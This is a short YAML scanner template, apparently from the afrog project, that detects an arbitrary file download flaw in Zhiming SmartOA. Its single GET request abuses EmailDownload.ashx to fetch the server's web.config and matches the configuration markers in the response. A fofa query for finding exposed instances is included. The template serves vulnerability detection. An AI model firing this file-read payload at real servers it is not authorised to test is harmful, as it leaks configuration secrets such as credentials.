# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <configuration>
          - <appSettings>
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/file/EmailDownload.ashx?url=~/web.config&name=web.config'
id: smartoa-emaildownload-fileread
info:
  author: zan8in
  description: |
    智明 SmartOA EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息
    fofa: app="智明协同-SmartOA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞
  severity: high
  tags: smartoa,emaildownload,fileread,unauthorized,argus-import
